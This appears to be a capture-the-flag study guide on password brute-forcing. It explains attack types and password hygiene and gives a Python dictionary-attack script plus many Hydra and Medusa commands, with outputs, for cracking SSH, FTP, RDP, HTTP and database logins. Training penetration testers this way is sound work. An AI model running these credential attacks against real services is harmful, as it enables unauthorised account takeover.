# Brute Forcing Overview

## Introduction
Keys and passwords, the modern equivalent of locks and combinations, secure the digital world. But what if someone tries every possible combination until they find the one that opens the door? That, in essence, is brute forcing.

## What is Brute Forcing?
In cybersecurity, brute forcing is a trial-and-error method used to crack passwords, login credentials, or encryption keys. It involves systematically trying every possible combination of characters until the correct one is found. The process can be likened to a thief trying every key on a giant keyring until they find the one that unlocks the treasure chest.

The success of a brute force attack depends on several factors, including:

- **The complexity of the password or key**: Longer passwords with a mix of uppercase and lowercase letters, numbers, and symbols are exponentially more complex to crack.
- **The computational power available to the attacker**: Modern computers and specialized hardware can try billions of combinations per second, significantly reducing the time needed for a successful attack.
- **The security measures in place**: Account lockouts, CAPTCHAs, and other defenses can slow down or even thwart brute-force attempts.

## How Brute Forcing Works
The brute force process can be visualized as follows:

1. **Start**: The attacker initiates the brute force process, often with the aid of specialized software.
2. **Generate Possible Combination**: The software generates a potential password or key combination based on predefined parameters, such as character sets and length.
3. **Apply Combination**: The generated combination is attempted against the target system, such as a login form or encrypted file.
4. **Check if Successful**: The system evaluates the attempted combination. If it matches the stored password or key, access is granted. Otherwise, the process continues.
5. **Access Granted**: The attacker gains unauthorized access to the system or data.
6. **End**: The process repeats, generating and testing new combinations until either the correct one is found or the attacker gives up.

## Types of Brute Forcing
Brute forcing is not a monolithic entity but a collection of diverse techniques, each with its strengths, weaknesses, and ideal use cases. Understanding these variations is crucial for both attackers and defenders, as it enables the former to choose the most effective approach and the latter to implement targeted countermeasures.

| Method                 | Description                                                                                   | Example                                                                                       | Best Used When...                                                                           |
|------------------------|-----------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------|
| **Simple Brute Force** | Systematically tries all possible combinations of characters within a defined character set.  | Trying all combinations of lowercase letters from 'a' to 'z' for passwords of length 4 to 6. | No prior information about the password is available, and computational resources are abundant. |
| **Dictionary Attack**  | Uses a pre-compiled list of common words, phrases, and passwords.                            | Trying passwords from a list like `rockyou.txt` against a login form.                        | The target will likely use a weak or easily guessable password based on common patterns.   |
| **Hybrid Attack**      | Combines elements of simple brute force and dictionary attacks.                              | Adding numbers or special characters to the end of words from a dictionary list.             | The target might use a slightly modified version of a common password.                     |
| **Credential Stuffing**| Leverages leaked credentials from one service to attempt access to other services.           | Using a list of usernames and passwords leaked from a data breach to try logging in.         | A large set of leaked credentials is available, and the target is suspected of reusing passwords. |
| **Password Spraying**  | Attempts a small set of commonly used passwords against a large number of usernames.         | Trying passwords like `password123` or `qwerty` across multiple accounts.                   | Account lockout policies are in place, and the attacker aims to avoid detection.            |
| **Rainbow Table Attack** | Uses pre-computed tables of password hashes to reverse hashes.                            | Pre-computing hashes for passwords and comparing them to captured hashes.                   | A large number of password hashes need to be cracked, and storage space is available.      |
| **Reverse Brute Force**| Targets a single password against multiple usernames.                                       | Using a leaked password to try logging into various accounts.                               | A strong suspicion exists that a particular password is reused across multiple accounts.   |
| **Distributed Brute Force** | Distributes the brute forcing workload across multiple devices.                        | Using a cluster of computers to accelerate the attack.                                      | The target password is highly complex, and single-machine computational power is insufficient. |

## The Role of Brute Forcing in Penetration Testing
Penetration testing, or ethical hacking, is a proactive cybersecurity measure that simulates real-world attacks to identify and address vulnerabilities before malicious actors can exploit them. Brute forcing is a crucial tool in this process, particularly when assessing the resilience of password-based authentication mechanisms.

Brute forcing is often employed in penetration testing when:

- **Other avenues are exhausted**: Initial attempts to gain access, such as exploiting known vulnerabilities or using social engineering, may fail. Brute forcing can act as a fallback.
- **Password policies are weak**: Systems with lax password policies are more susceptible to brute force attacks, exposing their vulnerabilities.
- **Specific accounts are targeted**: Penetration testers might focus on accounts with elevated privileges, tailoring brute force methods to compromise these accounts directly.

Understanding and simulating these techniques help organizations strengthen their defenses against potential attackers.

---

# Password Security Fundamentals

## The Importance of Strong Passwords
Passwords are the first line of defense in protecting sensitive information and systems. A strong password is a formidable barrier, making it significantly harder for attackers to gain unauthorized access through brute forcing or other techniques. The longer and more complex a password is, the more combinations an attacker has to try, exponentially increasing the time and resources required for a successful attack.

## The Anatomy of a Strong Password
The National Institute of Standards and Technology (NIST) provides guidelines for creating strong passwords. These guidelines emphasize the following characteristics:

- **Length**: The longer the password, the better. Aim for a minimum of 12 characters, but longer is always preferable. Each additional character dramatically increases the number of possible combinations.
- **Complexity**: Use uppercase and lowercase letters, numbers, and symbols. Avoid predictable patterns or sequences.
- **Uniqueness**: Don’t reuse passwords across different accounts. Each account should have its own unique password.
- **Randomness**: Avoid using dictionary words, personal information, or common phrases. Random passwords are harder to crack.

## Common Password Weaknesses
Despite the importance of strong passwords, many users still rely on weak and easily guessable passwords. Common weaknesses include:

- **Short Passwords**: Vulnerable due to fewer possible combinations.
- **Common Words and Phrases**: Susceptible to dictionary attacks.
- **Personal Information**: Easily guessed from publicly available data.
- **Reusing Passwords**: Puts multiple accounts at risk if one is compromised.
- **Predictable Patterns**: Simple patterns like `123456` or `password` are widely known to attackers.

## Password Policies
Organizations implement password policies to enforce the use of strong passwords. These policies typically include:

- **Minimum Length**: Specifies a minimum number of characters.
- **Complexity Requirements**: Mandates the inclusion of diverse character types.
- **Password Expiration**: Requires periodic password changes.
- **Password History**: Prevents reuse of recent passwords.

While these policies enhance security, they can lead to poor practices, such as writing passwords down or using slight variations. Balancing security with usability is key.

## The Perils of Default Credentials
Default passwords, pre-set by manufacturers, are a significant vulnerability. Attackers exploit these easily guessable credentials, often published in manuals or online. Examples include:

![image](https://github.com/user-attachments/assets/3eeb114d-58cb-4d1e-934b-d917ef5ee4e5)


### Why Default Credentials Are Risky
- **Predictable Usernames**: Common usernames like `admin` or `root` provide attackers with a starting point.
- **Ease of Automation**: Attackers use tools to automate attempts with known default credentials.

Changing default passwords and usernames is a simple yet effective defense against such attacks.

## Brute-forcing and Password Security
In a brute-force scenario, the strength of the target passwords becomes the attacker's primary obstacle:

- **Evaluating System Vulnerability**: Password policies and user behavior determine the likelihood of success.
- **Strategic Tool Selection**: Password complexity influences the tools and methods used.
- **Resource Allocation**: Time and computational power needed depend on password strength.
- **Exploiting Weak Points**: Default credentials are often the easiest entry points.

For penetration testers, understanding password security is essential for identifying vulnerabilities and informing strategies. For defenders, it highlights the importance of robust password practices and the role users play in securing sensitive information.

---

# Dictionary Attacks

## The Power of Words
The effectiveness of a dictionary attack lies in its ability to exploit the human tendency to prioritize memorable passwords over secure ones. Many individuals continue to use passwords based on readily available information such as dictionary words, common phrases, names, or predictable patterns. This predictability makes them vulnerable to dictionary attacks, where attackers systematically test a pre-defined list of potential passwords against the target system.

### Key Factors for Success
- **Quality of the Wordlist**: A well-crafted wordlist tailored to the target audience or system significantly increases the probability of success.
- **Understanding Human Behavior**: Attackers leverage insights into common password practices to refine their wordlists.
- **Targeted Wordlists**: Tailoring wordlists to specific contexts (e.g., gaming-related terms for gamers) improves attack efficiency.

### Brute Force vs. Dictionary Attack
| Feature            | Dictionary Attack                               | Brute Force Attack                              | Explanation                                                                                |
|--------------------|------------------------------------------------|------------------------------------------------|--------------------------------------------------------------------------------------------|
| **Efficiency**     | Faster and more resource-efficient             | Time-consuming and resource-intensive           | Dictionary attacks narrow the search space with a pre-defined list of likely passwords.    |
| **Targeting**      | Adaptable to specific targets or systems       | No inherent targeting capability                | Wordlists can incorporate context-specific information.                                    |
| **Effectiveness**  | Effective against weak or common passwords     | Effective against all passwords given time     | Dictionary attacks succeed quickly if the password is in the wordlist.                    |
| **Limitations**    | Ineffective against random, complex passwords  | Impractical for lengthy, complex passwords      | Truly random passwords render dictionary attacks futile.                                   |

### Example Scenario
An attacker targeting a company's login portal might construct a specialized wordlist incorporating:
- Common weak passwords (e.g., `password123`)
- Company-specific terms
- Employee or department names
- Industry-specific jargon

By using this targeted wordlist, the attacker increases their likelihood of success compared to a random brute-force attack.

## Building and Utilizing Wordlists

### Sources of Wordlists
- **Publicly Available Lists**: Repositories like [SecLists](https://github.com/danielmiessler/SecLists) host diverse wordlists, including leaked passwords and default credentials.
- **Custom-Built Lists**: Penetration testers can create wordlists based on reconnaissance data, such as hobbies, interests, or known patterns.
- **Specialized Lists**: Tailored for specific industries, applications, or organizations.
- **Pre-existing Lists**: Common tools often include pre-packaged wordlists, such as `rockyou.txt`.

| Wordlist                        | Description                                               | Typical Use                                      | Source                       |
|---------------------------------|-----------------------------------------------------------|-------------------------------------------------|------------------------------|
| **rockyou.txt**                 | Millions of leaked passwords from the RockYou breach      | Password brute force attacks                    | RockYou breach dataset       |
| **top-usernames-shortlist.txt** | Concise list of common usernames                         | Quick brute force username attempts             | SecLists                     |
| **2023-200_most_used_passwords.txt** | 200 most commonly used passwords as of 2023              | Targeting reused passwords                      | SecLists                     |
| **Default-Credentials/default-passwords.txt** | Default usernames and passwords for devices/software    | Trying default credentials                      | SecLists                     |

## Throwing a Dictionary at the Problem

The target system creates a route (`/dictionary`) to handle POST requests. It expects a `password` parameter in the request's form data. If the submitted password matches, it responds with a JSON object containing a success message and a flag. Otherwise, it returns a 401 Unauthorized error.

### Python Script for Dictionary Attack
The following Python script performs a dictionary attack against the `/dictionary` endpoint:

```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

### Execution Example
Running the script:

```
DJMC@htb[/htb]$ python3 dictionary-solver.py

...
Attempted password: turtle
Attempted password: tiffany
Attempted password: golf
Attempted password: bear
Attempted password: tiger
Correct password found: tiger
Flag: HTB{...}
```

### Script Workflow
1. **Downloads Wordlist**: Fetches a list of 500 weak passwords from SecLists.
2. **Iterates and Submits**: Tests each password by sending a POST request to the `/dictionary` endpoint.
3. **Analyzes Responses**: Checks if the response indicates success (HTTP 200) and extracts the flag if found.
4. **Continues or Terminates**: Iterates until the correct password is found or the wordlist is exhausted.

This example demonstrates how dictionary attacks exploit predictable passwords and underscores the necessity of robust password policies to mitigate such vulnerabilities.

---

# Hybrid Attacks

## The Problem of Predictable Password Patterns
Many organizations implement policies requiring users to change their passwords periodically to enhance security. Unfortunately, these policies can inadvertently encourage predictable password patterns if users are not adequately educated on proper password hygiene.

A widespread and insecure practice among users is making minor modifications to their passwords when forced to change them. For instance, a user might:
- Change `Summer2023` to `Summer2023!`
- Update `Summer2023` to `Summer2024`

This predictable behavior creates a loophole that hybrid attacks can exploit. Hybrid attacks combine the strengths of dictionary and brute-force methods, targeting these common patterns.

## Hybrid Attacks in Action
### Practical Example
Consider an attacker targeting an organization known to enforce regular password changes:
1. **Phase 1: Dictionary Attack**
   - The attacker uses a curated wordlist with common passwords, industry-specific terms, and personal information.
   - Quickly identifies any weak or guessable passwords.

2. **Phase 2: Targeted Brute Force**
   - If unsuccessful, the attacker transitions to a hybrid approach.
   - Modifies words from the original wordlist by appending numbers, special characters, or incrementing years (e.g., `Summer2023` → `Summer2023!` → `Summer2024`).

This reduces the search space compared to traditional brute-force attacks, improving efficiency while retaining high success rates.

## Advantages of Hybrid Attacks
- **Efficiency**: Narrowed search space compared to brute-force attacks.
- **Adaptability**: Can target known user behaviors or organizational patterns.
- **Effectiveness**: Particularly potent against predictable password modifications.

## Practical Implementation
### Scenario: Filtering a Wordlist Against a Password Policy
#### Password Policy Requirements
- Minimum length: 8 characters
- Must include:
  - At least one uppercase letter
  - At least one lowercase letter
  - At least one number

#### Steps
1. **Download the Wordlist**

```bash
DJMC@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/darkweb2017-top10000.txt
```

2. **Filter by Minimum Length**

```bash
DJMC@htb[/htb]$ grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt
```

3. **Filter for Uppercase Letters**

```bash
DJMC@htb[/htb]$ grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
```

4. **Filter for Lowercase Letters**

```bash
DJMC@htb[/htb]$ grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt
```

5. **Filter for Numerical Characters**

```bash
DJMC@htb[/htb]$ grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
```

6. **Count Remaining Passwords**

```bash
DJMC@htb[/htb]$ wc -l darkweb2017-number.txt
89 darkweb2017-number.txt
```

By filtering a 10,000-password list, we narrow it down to 89 entries. This smaller, targeted list is more efficient for cracking attempts.

---

## Credential Stuffing: Leveraging Stolen Data
Credential stuffing exploits the common practice of reusing passwords across multiple online accounts.

### Attack Stages
1. **Acquire Credentials**:
   - Gather username-password pairs from breaches, phishing, or malware.
   - Use publicly available lists, such as `rockyou` or SecLists datasets.

2. **Select Targets**:
   - Focus on services likely tied to the credentials (e.g., social media, email, banking).

3. **Automate Testing**:
   - Use tools to systematically test credentials, mimicking normal user behavior to avoid detection.

### Impact
- **Unauthorized Access**: Data theft, identity fraud, financial crimes.
- **Domino Effect**: Compromising one account often compromises others due to password reuse.

### Prevention Tips
- Use unique passwords for every account.
- Employ multi-factor authentication.
- Educate users about password hygiene.

Credential stuffing highlights the importance of strong, unique passwords and proactive security measures to safeguard online accounts.

---

# Hydra

Hydra is a fast network login cracker that supports numerous attack protocols. It is a versatile tool that can brute-force a wide range of services, including web applications, remote login services like SSH and FTP, and even databases.

## Why Hydra is Popular
- **Speed and Efficiency**: Hydra utilizes parallel connections to perform multiple login attempts simultaneously, significantly speeding up the cracking process.
- **Flexibility**: Hydra supports many protocols and services, making it adaptable to various attack scenarios.
- **Ease of Use**: Hydra has a straightforward command-line interface and clear syntax.

## Installation
Hydra often comes pre-installed on popular penetration testing distributions. Verify its presence by running:

```bash
DJMC@htb[/htb]$ hydra -h
```

If Hydra is not installed, you can install it on a Linux distribution with:

```bash
DJMC@htb[/htb]$ sudo apt-get -y update
DJMC@htb[/htb]$ sudo apt-get -y install hydra
```

## Basic Usage
Hydra's basic syntax is:

```bash
DJMC@htb[/htb]$ hydra [login_options] [password_options] [attack_options] [service_options]
```

### Common Parameters
![image](https://github.com/user-attachments/assets/81345918-4129-440a-b783-2c47d7a5dc59)

---

## Hydra Services
Hydra supports many services and protocols. Below are some commonly used ones:

# Hydra Service Commands

| **Service/Protocol** | **Description** | **Example Command** |
|------------------|-------------|-----------------|
| **ftp** | File Transfer Protocol (FTP). Used to brute-force login credentials for FTP services, commonly used to transfer files over a network. | `hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100` |
| **ssh** | Secure Shell (SSH). Targets SSH services to brute-force credentials, commonly used for secure remote login to systems. | `hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100` |
| **http-get/post** | HTTP Web Services. Used to brute-force login credentials for HTTP web login forms using either GET or POST requests. | `hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"` |
| **smtp** | Simple Mail Transfer Protocol. Attacks email servers by brute-forcing login credentials for SMTP, commonly used to send emails. | `hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com` |
| **pop3** | Post Office Protocol (POP3). Targets email retrieval services to brute-force credentials for POP3 login. | `hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com` |
| **imap** | Internet Message Access Protocol. Used to brute-force credentials for IMAP services, which allow users to access their email remotely. | `hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com` |
| **mysql** | MySQL Database. Attempts to brute-force login credentials for MySQL databases. | `hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100` |
| **mssql** | Microsoft SQL Server. Targets Microsoft SQL servers to brute-force database login credentials. | `hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100` |
| **vnc** | Virtual Network Computing (VNC). Brute-forces VNC services, used for remote desktop access. | `hydra -P /path/to/password_list.txt vnc://192.168.1.100` |
| **rdp** | Remote Desktop Protocol (RDP). Targets Microsoft RDP services for remote login brute-forcing. | `hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100` |


---

## Example Use Cases

### Brute-Forcing HTTP Authentication
```bash
DJMC@htb[/htb]$ hydra -L usernames.txt -P passwords.txt www.example.com http-get
```
- **Target**: Basic HTTP authentication at `www.example.com`
- **Description**: Hydra systematically tests username-password combinations.

### Targeting Multiple SSH Servers
```bash
DJMC@htb[/htb]$ hydra -l root -p toor -M targets.txt ssh
```
- **Target**: Multiple servers listed in `targets.txt`
- **Description**: Uses the `ssh` module to test login credentials simultaneously.

### Testing FTP on a Non-Standard Port
```bash
DJMC@htb[/htb]$ hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```
- **Target**: FTP service at `ftp.example.com` on port `2121`
- **Description**: Provides verbose output for detailed progress tracking.

### Brute-Forcing a Web Login Form
```bash
DJMC@htb[/htb]$ hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```
- **Target**: Web login form at `www.example.com`
- **Description**: Checks for successful login via HTTP status code `302`.

### Advanced RDP Brute-Forcing
```bash
DJMC@htb[/htb]$ hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```
- **Target**: RDP service on `192.168.1.100`
- **Description**: Generates and tests passwords with 6–8 characters, including lowercase, uppercase, and numbers.

---

# Basic HTTP Authentication

## Overview
Web applications often employ authentication mechanisms to protect sensitive data and functionalities. **Basic HTTP Authentication** (Basic Auth) is a rudimentary yet common method for securing resources on the web. While easy to implement, its inherent vulnerabilities make it a frequent target for brute-force attacks.

### How It Works
Basic Auth is a challenge-response protocol:
1. **Access Attempt**: A user tries to access a restricted area.
2. **Server Challenge**: The server responds with a `401 Unauthorized` status and a `WWW-Authenticate` header prompting the browser to present a login dialog.
3. **Credentials Submission**: The user provides a username and password, which the browser concatenates into a string (e.g., `username:password`).
4. **Base64 Encoding**: The string is encoded using Base64 and included in the `Authorization` header of subsequent requests:

    ```http
    GET /protected_resource HTTP/1.1
    Host: www.example.com
    Authorization: Basic YWxpY2U6c2VjcmV0MTIz
    ```
5. **Server Validation**: The server decodes the credentials, verifies them, and grants or denies access.

---

## Exploiting Basic Auth with Hydra

### Scenario
The target system employs Basic HTTP Authentication. You know the username (`basic-auth-user`) and will use Hydra to brute-force the password.

### Command
```bash
# Download the wordlist if needed
DJMC@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt

# Hydra command
DJMC@htb[/htb]$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
```

### Hydra Output
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-09 16:04:31
[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
[DATA] attacking http-get://127.0.0.1:81/
[81][http-get] host: 127.0.0.1   login: basic-auth-user   password: ...
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-09 16:04:32
```

### Command Breakdown
- **`-l basic-auth-user`**: Specifies the username for login attempts.
- **`-P 2023-200_most_used_passwords.txt`**: Uses the password list file for the brute-force attack.
- **`127.0.0.1`**: Target IP address (localhost).
- **`http-get /`**: Targets the HTTP server with GET requests to the root path (`/`).
- **`-s 81`**: Sets the HTTP service port to 81.

### Result
Hydra systematically attempts each password from the `2023-200_most_used_passwords.txt` file. Upon finding the correct password, Hydra outputs it, enabling you to log in and retrieve the flag.

---

### Summary
Basic HTTP Authentication's simplicity makes it a useful yet vulnerable security measure. Tools like Hydra exploit these vulnerabilities by leveraging systematic brute-force techniques, emphasizing the need for robust password policies and stronger authentication mechanisms.

---

# Login Forms

## Overview
Beyond the realm of Basic HTTP Authentication, many web applications employ custom login forms as their primary authentication mechanism. These forms, while visually diverse, often share common underlying mechanics that make them targets for brute-forcing.

### Understanding Login Forms
Login forms are HTML-based structures embedded within web pages. They typically include:
- Input fields (`<input>`) for capturing the username and password.
- A submit button (`<button>` or `<input type="submit">`) to initiate the authentication process.

### Example Login Form
```html
<form action="/login" method="post">
  <label for="username">Username:</label>
  <input type="text" id="username" name="username"><br><br>
  <label for="password">Password:</label>
  <input type="password" id="password" name="password"><br><br>
  <input type="submit" value="Submit">
</form>
```

### Example HTTP POST Request
```http
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=john&password=secret123
```

### Key Details
- **Method**: `POST`
- **Path**: `/login`
- **Headers**: `Content-Type`, `Content-Length`
- **Body**: Username and password encoded as key-value pairs.

---

## Brute-Forcing Login Forms with Hydra

Hydra’s `http-post-form` module targets login forms by automating POST requests and dynamically substituting username and password combinations.

### Hydra Command Structure
```bash
hydra [options] target http-post-form "path:params:condition_string"
```

#### Understanding the Condition String
- **Failure Condition (F=...)**: Identifies a failed login attempt by checking for specific text in the response (e.g., `F=Invalid credentials`).
- **Success Condition (S=...)**: Identifies a successful login attempt by checking for specific text or status codes (e.g., `S=302` or `S=Dashboard`).

#### Example Conditions
- Failure: `F=Invalid credentials`
- Success by status: `S=302`
- Success by content: `S=Dashboard`

---

## Steps to Use Hydra

### 1. Inspect the Login Form
Use browser developer tools to analyze the form’s structure:
- **Method**: `POST`
- **Fields**: `username`, `password`
- **Endpoint**: `/`

#### Example HTML
```html
<form method="POST">
    <h2>Login</h2>
    <label for="username">Username:</label>
    <input type="text" id="username" name="username">
    <label for="password">Password:</label>
    <input type="password" id="password" name="password">
    <input type="submit" value="Login">
</form>
```

#### Analyze the Request
Submit sample credentials and check the request data using developer tools or a proxy tool like Burp Suite:
- **Path**: `/`
- **Fields**: `username`, `password`
- **Error Message**: "Invalid credentials"

### 2. Construct the Params String
Based on the analysis, construct the `params` string for Hydra:
```bash
/:username=^USER^&password=^PASS^:F=Invalid credentials
```
- **Path**: `/`
- **Fields**: `username`, `password`
- **Failure Condition**: `F=Invalid credentials`

---

### 3. Run Hydra

#### Download Wordlists
```bash
DJMC@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
DJMC@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/2023-200_most_used_passwords.txt
```

#### Execute the Command
```bash
DJMC@htb[/htb]$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

#### Example Output
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200), ~213 tries per task
[DATA] attacking http-post-form://IP:PORT/:username=^USER^&password=^PASS^:F=Invalid credentials
[5000][http-post-form] host: IP   login: ...   password: ...
[STATUS] attack finished for IP (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra finished.
```

---

### Summary
1. **Analyze** the login form and request data.
2. **Construct** the params string based on the form structure and failure conditions.
3. **Run Hydra** with appropriate wordlists and parameters.
4. **Retrieve** the valid credentials and login to the target system.

By carefully crafting the params string and using the correct wordlists, Hydra can effectively brute-force login forms, emphasizing the importance of robust security practices in web applications.

---

# Medusa

Medusa, a prominent tool in the cybersecurity arsenal, is designed to be a fast, massively parallel, and modular login brute-forcer. It supports a wide array of services that allow remote authentication, enabling penetration testers and security professionals to assess the resilience of login systems against brute-force attacks.

---

## Installation
Medusa often comes pre-installed on popular penetration testing distributions. To verify its presence, run:

```bash
DJMC@htb[/htb]$ medusa -h
```

If not installed, use the following commands:

```bash
DJMC@htb[/htb]$ sudo apt-get -y update
DJMC@htb[/htb]$ sudo apt-get -y install medusa
```

---

## Command Syntax and Parameters
Medusa’s command-line interface is straightforward, allowing users to specify hosts, credentials, and modules with fine-tuned options:

```bash
DJMC@htb[/htb]$ medusa [target_options] [credential_options] -M module [module_options]
```

### Common Parameters
![image](https://github.com/user-attachments/assets/f43688f4-40fd-4ea6-a3bb-9f147fada512)

---

## Medusa Modules
Medusa supports a variety of modules for interacting with authentication mechanisms. Each module is tailored to specific protocols or services.

### Common Modules
![image](https://github.com/user-attachments/assets/8c615f59-b1c6-414c-8778-eb87f7819aaf)

---

## Use Cases

### 1. Targeting an SSH Server
#### Scenario
You need to test the security of an SSH server at `192.168.0.100` with a list of potential usernames (`usernames.txt`) and passwords (`passwords.txt`).

```bash
DJMC@htb[/htb]$ medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh
```

### 2. Testing Multiple Web Servers with Basic HTTP Authentication
#### Scenario
You have a list of web servers (`web_servers.txt`) using basic HTTP authentication. Test them with common usernames and passwords:

```bash
DJMC@htb[/htb]$ medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
```

### 3. Detecting Empty or Default Passwords
#### Scenario
You want to check if accounts on a host (`10.0.0.5`) have empty or default passwords.

```bash
DJMC@htb[/htb]$ medusa -h 10.0.0.5 -U usernames.txt -e ns -M ssh
```
- `-e n`: Check for empty passwords.
- `-e s`: Check if the password matches the username.

---

## Summary
Medusa’s speed, modularity, and flexibility make it a powerful tool for assessing authentication mechanisms. With its support for a variety of protocols and detailed configuration options, it provides security professionals the capability to identify weak credentials effectively while emphasizing the need for robust authentication practices.

---

# Web Services

In the dynamic landscape of cybersecurity, maintaining robust authentication mechanisms is paramount. Services like Secure Shell (SSH) and File Transfer Protocol (FTP), while facilitating secure remote access and file management, rely heavily on username-password combinations, making them vulnerable to brute-force attacks. This module illustrates the practical use of Medusa to exploit SSH and FTP services, emphasizing the importance of fortified authentication practices.

---

## SSH Overview
**SSH** is a cryptographic network protocol used for secure remote login, command execution, and file transfers over an unsecured network. While its encryption makes it secure, weak passwords can expose it to brute-force attacks.

---

## FTP Overview
**FTP** is a standard protocol for transferring files between a client and a server. However, standard FTP transmits data in plaintext, making it susceptible to interception and brute-forcing.

---

## SSH Brute-Forcing with Medusa

### Command
```bash
DJMC@htb[/htb]$ medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

### Command Breakdown
- `-h <IP>`: Target system's IP address.
- `-n <PORT>`: Port for SSH service (default: 22).
- `-u sshuser`: Username for the attack.
- `-P 2023-200_most_used_passwords.txt`: Password list.
- `-M ssh`: Specifies the SSH module.
- `-t 3`: Runs three parallel login attempts.

### Example Output
```
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
...
ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t [SUCCESS]
```

### SSH Connection
With the correct password:
```bash
DJMC@htb[/htb]$ ssh sshuser@<IP> -p <PORT>
```
This establishes an interactive SSH session.

---

## Expanding the Attack Surface
Once inside the system, identify other services:

### Check Open Ports
```bash
DJMC@htb[/htb]$ netstat -tulpn | grep LISTEN
```
Example Output:
```
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::21                   :::*                    LISTEN      -
```

### Confirm with Nmap
```bash
DJMC@htb[/htb]$ nmap localhost
```
Example Output:
```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```

---

## FTP Brute-Forcing with Medusa

### Command
```bash
DJMC@htb[/htb]$ medusa -h 127.0.0.1 -u ftpuser -P 2023-200_most_used_passwords.txt -M ftp -t 5
```

### Command Breakdown
- `-h 127.0.0.1`: Targets the local system.
- `-u ftpuser`: Username for the FTP server.
- `-P 2023-200_most_used_passwords.txt`: Password list.
- `-M ftp`: Specifies the FTP module.
- `-t 5`: Runs five parallel login attempts.

### Example Output
```
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ftpuser Password: pass123 [SUCCESS]
```

---

## Retrieving the Flag
With valid FTP credentials:

### Establish FTP Connection
```bash
DJMC@htb[/htb]$ ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
```

### Download the Flag
```bash
ftp> get flag.txt
```
Example Output:
```
local: flag.txt remote: flag.txt
226 Transfer complete.
ftp> exit
221 Goodbye.
```

---

## Summary
1. Use Medusa to brute-force SSH and FTP services.
2. Leverage SSH access to identify other services.
3. Use Medusa on discovered services, such as FTP, to gain further access.
4. Secure sensitive files, such as `flag.txt`, by downloading them via FTP.

Medusa demonstrates the importance of using robust authentication mechanisms and emphasizes the risks of weak or default credentials.

---

# Custom Wordlists

Pre-made wordlists like `rockyou` or `SecLists` provide extensive repositories of potential passwords and usernames. However, they operate broadly, often missing unique patterns specific to individuals or organizations. Custom wordlists fill this gap by tailoring lists to the target, increasing efficiency and success rates in brute-force attacks.

---

## Username Generation with Username Anarchy
Even simple names like "Jane Smith" can have a multitude of username variations. Custom username lists account for initials, substitutions, and personal preferences.

### Installing Username Anarchy
```bash
DJMC@htb[/htb]$ sudo apt install ruby -y
DJMC@htb[/htb]$ git clone https://github.com/urbanadventurer/username-anarchy.git
DJMC@htb[/htb]$ cd username-anarchy
```

### Generating Usernames
Run Username Anarchy with the target’s first and last names:
```bash
DJMC@htb[/htb]$ ./username-anarchy Jane Smith > jane_smith_usernames.txt
```

Generated usernames may include:
- `janesmith`, `smithjane`, `j.smith`
- `janemarie`, `smithj87`
- Leetspeak variations like `j4n3`, `5m1th`

---

